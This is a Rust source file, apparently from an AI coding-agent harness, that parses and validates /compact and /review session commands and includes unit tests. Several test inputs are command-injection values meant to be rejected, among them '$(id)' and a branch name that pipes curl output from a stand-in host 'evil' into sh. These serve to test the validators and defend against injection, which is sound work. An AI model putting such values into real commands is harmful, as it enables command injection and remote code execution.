//! Harness-neutral session actions. Each runs as an ordinary Turn on an idle
//! session whose negotiated capabilities admit it; a binding maps it to its
//! own native method.
use serde::{Deserialize, Serialize};

use super::{contract::RequiredText, intent::CapabilitySnapshotV1};

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(
    tag = "kind",
    rename_all = "camelCase",
    rename_all_fields = "camelCase",
    deny_unknown_fields
)]
pub(crate) enum SessionAction {
    Compact {},
    Review { target: ReviewTarget },
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(
    tag = "kind",
    rename_all = "camelCase",
    rename_all_fields = "camelCase",
    deny_unknown_fields
)]
/// What a review covers, as Codex's `review/start` names its targets.
pub(crate) enum ReviewTarget {
    UncommittedChanges {},
    BaseBranch { branch: Branch },
    Commit { sha: Sha },
    Custom { instructions: Instructions },
}

/// A branch a `/review` names, in the characters git ref names commonly
/// use. Codex writes it into git commands it suggests to the model, so it
/// carries no quoting or shell syntax, and it cannot read as an option or
/// a range.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(transparent)]
pub(crate) struct Branch(String);

impl Branch {
    pub(crate) fn new(value: &str) -> Option<Self> {
        (!value.is_empty()
            && value.len() <= 256
            && !value.starts_with(['-', '.', '/'])
            && !value.contains("..")
            && value
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b"._/@+-".contains(&b)))
        .then(|| Self(value.to_owned()))
    }
    pub(crate) fn as_str(&self) -> &str {
        &self.0
    }
}

/// A commit a `/review` names: an abbreviated or full hex object id.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(transparent)]
pub(crate) struct Sha(String);

impl Sha {
    pub(crate) fn new(value: &str) -> Option<Self> {
        ((4..=64).contains(&value.len()) && value.bytes().all(|b| b.is_ascii_hexdigit()))
            .then(|| Self(value.to_owned()))
    }
    pub(crate) fn as_str(&self) -> &str {
        &self.0
    }
}

/// What a custom review looks for, as `/review <instructions>` reads back:
/// trimmed, and not in the form that names a branch or commit.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(transparent)]
pub(crate) struct Instructions(RequiredText<16384>);

impl Instructions {
    pub(crate) fn new(value: &str) -> Option<Self> {
        if value.trim() != value || named_target(value).is_some() {
            return None;
        }
        RequiredText::new("instructions", value).ok().map(Self)
    }
    pub(crate) fn as_str(&self) -> &str {
        self.0.as_str()
    }
}

macro_rules! deserialize_checked {
    ($($name:ident: $what:literal),*) => {$(
        impl<'de> Deserialize<'de> for $name {
            fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> Result<Self, D::Error> {
                let value = String::deserialize(deserializer)?;
                Self::new(&value).ok_or_else(|| serde::de::Error::custom($what))
            }
        }
    )*};
}
deserialize_checked!(Branch: "not a branch name", Sha: "not a commit id",
    Instructions: "not review instructions");

/// The branch or commit `/review base <branch>` or `/review commit <sha>`
/// names.
fn named_target(input: &str) -> Option<ReviewTarget> {
    match input.split_whitespace().collect::<Vec<_>>().as_slice() {
        ["base", branch] => Branch::new(branch).map(|branch| ReviewTarget::BaseBranch { branch }),
        ["commit", sha] => Sha::new(sha).map(|sha| ReviewTarget::Commit { sha }),
        _ => None,
    }
}

/// The `/` commands that name session actions, as their prompts read.
pub(crate) const COMMAND_NAMES: [&str; 2] = ["compact", "review"];

impl SessionAction {
    pub(crate) fn admitted_by(&self, capabilities: &CapabilitySnapshotV1) -> bool {
        match self {
            Self::Compact {} => capabilities.native_session_compact,
            Self::Review { .. } => capabilities.native_review,
        }
    }

    /// The Turn's user-visible prompt, in the form a `/` command takes;
    /// [`Self::from_command`] reads it back.
    pub(crate) fn prompt_text(&self) -> String {
        match self {
            Self::Compact {} => "/compact".to_owned(),
            Self::Review { target } => match target {
                ReviewTarget::UncommittedChanges {} => "/review".to_owned(),
                ReviewTarget::BaseBranch { branch } => format!("/review base {}", branch.as_str()),
                ReviewTarget::Commit { sha } => format!("/review commit {}", sha.as_str()),
                ReviewTarget::Custom { instructions } => {
                    format!("/review {}", instructions.as_str())
                }
            },
        }
    }

    /// The action a `/name input` command names. `/review` alone reviews
    /// the uncommitted changes, `/review base <branch>` and `/review commit
    /// <sha>` name a branch or commit, and any other input is what to look
    /// for. `/compact` takes no input.
    pub(crate) fn from_command(name: &str, input: Option<&str>) -> Option<Self> {
        let input = input.map(str::trim).filter(|input| !input.is_empty());
        match (name, input) {
            ("compact", None) => Some(Self::Compact {}),
            ("review", None) => Some(Self::Review {
                target: ReviewTarget::UncommittedChanges {},
            }),
            ("review", Some(input)) => Some(Self::Review {
                target: match named_target(input) {
                    Some(target) => target,
                    None => ReviewTarget::Custom {
                        instructions: Instructions::new(input)?,
                    },
                },
            }),
            _ => None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn actions_decode_only_the_offered_targets() {
        let review: SessionAction =
            serde_json::from_value(json!({"kind":"review","target":{"kind":"uncommittedChanges"}}))
                .unwrap();
        assert_eq!(review.prompt_text(), "/review");
        assert!(COMMAND_NAMES.contains(&&review.prompt_text()[1..]));
        assert_eq!(
            serde_json::from_value::<SessionAction>(json!({"kind":"compact"}))
                .unwrap()
                .prompt_text(),
            "/compact"
        );
        for invalid in [
            json!({"kind":"review","target":{"kind":"baseBranch","branch":"two words"}}),
            json!({"kind":"review","target":{"kind":"baseBranch","branch":"--force"}}),
            json!({"kind":"review","target":{"kind":"commit","sha":""}}),
            json!({"kind":"review","target":{"kind":"commit","sha":"HEAD~1"}}),
            json!({"kind":"review","target":{"kind":"commit","sha":"$(id)"}}),
            json!({"kind":"review","target":{"kind":"baseBranch","branch":"x\";curl${IFS}evil|sh;\""}}),
            json!({"kind":"review","target":{"kind":"baseBranch","branch":"main..topic"}}),
            json!({"kind":"review","target":{"kind":"baseBranch","branch":"main@{upstream}"}}),
            // Instructions a `/review` would read back as another target.
            json!({"kind":"review","target":{"kind":"custom","instructions":"base main"}}),
            json!({"kind":"review","target":{"kind":"custom","instructions":"commit  abcd"}}),
            json!({"kind":"review","target":{"kind":"custom","instructions":" padded"}}),
            json!({"kind":"review","target":{"kind":"custom","instructions":""}}),
            json!({"kind":"review"}),
            json!({"kind":"review","target":{"kind":"uncommittedChanges","extra":1}}),
            json!({"kind":"compact","extra":1}),
            json!({"kind":"revert"}),
        ] {
            assert!(serde_json::from_value::<SessionAction>(invalid).is_err());
        }
    }

    #[test]
    fn a_command_names_its_action_and_the_prompt_reads_back_as_it() {
        for (name, input, action) in [
            ("compact", None, json!({"kind":"compact"})),
            (
                "review",
                None,
                json!({"kind":"review","target":{"kind":"uncommittedChanges"}}),
            ),
            (
                "review",
                Some("  "),
                json!({"kind":"review","target":{"kind":"uncommittedChanges"}}),
            ),
            (
                "review",
                Some("base main"),
                json!({"kind":"review","target":{"kind":"baseBranch","branch":"main"}}),
            ),
            (
                "review",
                Some("commit 1a2b3c4"),
                json!({"kind":"review","target":{"kind":"commit","sha":"1a2b3c4"}}),
            ),
            (
                "review",
                Some("check the error paths"),
                json!({"kind":"review","target":{"kind":"custom","instructions":"check the error paths"}}),
            ),
            // A word that is not a branch or commit is read as instructions.
            (
                "review",
                Some("base --force"),
                json!({"kind":"review","target":{"kind":"custom","instructions":"base --force"}}),
            ),
            (
                "review",
                Some("base $(id)"),
                json!({"kind":"review","target":{"kind":"custom","instructions":"base $(id)"}}),
            ),
            (
                "review",
                Some("base feature/x-1.2"),
                json!({"kind":"review","target":{"kind":"baseBranch","branch":"feature/x-1.2"}}),
            ),
            (
                "review",
                Some("commit main"),
                json!({"kind":"review","target":{"kind":"custom","instructions":"commit main"}}),
            ),
        ] {
            let parsed = SessionAction::from_command(name, input).unwrap();
            assert_eq!(
                serde_json::to_value(&parsed).unwrap(),
                action,
                "{name} {input:?}"
            );
            let text = parsed.prompt_text();
            let (read_name, read_input) = text[1..]
                .split_once(' ')
                .map_or((&text[1..], None), |(n, i)| (n, Some(i)));
            assert_eq!(
                SessionAction::from_command(read_name, read_input),
                Some(parsed)
            );
            assert_eq!(
                serde_json::from_value::<SessionAction>(action)
                    .ok()
                    .map(|a| a.prompt_text()),
                Some(text)
            );
        }
        assert_eq!(SessionAction::from_command("compact", Some("now")), None);
        assert_eq!(SessionAction::from_command("deploy", None), None);
    }

    #[test]
    fn an_action_turn_keeps_its_action_beside_the_prompt_text() {
        let action: SessionAction =
            serde_json::from_value(json!({"kind":"review","target":{"kind":"uncommittedChanges"}}))
                .unwrap();
        let mut prompt = crate::acp::intent::Prompt::new("prompt", action.prompt_text()).unwrap();
        prompt.action = Some(action.clone());
        let connection = rusqlite::Connection::open_in_memory().unwrap();
        connection
            .execute_batch("CREATE TABLE items(turn_id TEXT,ordinal INTEGER,kind TEXT,payload_json TEXT,payload_bytes INTEGER)")
            .unwrap();
        let payload = json!({"kind":"text","payload":prompt.user_payload()}).to_string();
        connection
            .execute(
                "INSERT INTO items VALUES ('turn',0,'text',?1,?2)",
                rusqlite::params![payload, payload.len() as i64],
            )
            .unwrap();
        let metadata =
            crate::acp::transcript_quote::load_prompt_metadata(&connection, "turn").unwrap();
        assert_eq!(
            metadata.session_action,
            Some(serde_json::to_value(&action).unwrap())
        );
        assert!(crate::acp::store::decode_payload(&payload).is_ok());
        let plain = crate::acp::intent::Prompt::new("prompt", "/review").unwrap();
        assert!(plain.user_payload().get("sessionAction").is_none());
    }

    #[test]
    fn a_stored_action_this_build_does_not_run_still_loads_as_stored() {
        let connection = rusqlite::Connection::open_in_memory().unwrap();
        connection
            .execute_batch("CREATE TABLE items(turn_id TEXT,ordinal INTEGER,kind TEXT,payload_json TEXT,payload_bytes INTEGER)")
            .unwrap();
        let payload = json!({"kind":"text","payload":{"role":"user","text":"/review main",
            "sessionAction":{"kind":"review","target":{"kind":"baseBranch","branch":"main"}}}})
        .to_string();
        connection
            .execute(
                "INSERT INTO items VALUES ('turn',0,'text',?1,?2)",
                rusqlite::params![payload, payload.len() as i64],
            )
            .unwrap();
        let action = crate::acp::transcript_quote::load_prompt_metadata(&connection, "turn")
            .unwrap()
            .session_action;
        assert_eq!(
            action,
            Some(json!({"kind":"review","target":{"kind":"baseBranch","branch":"main"}}))
        );
        assert!(crate::acp::store::decode_payload(&payload).is_ok());
    }
}
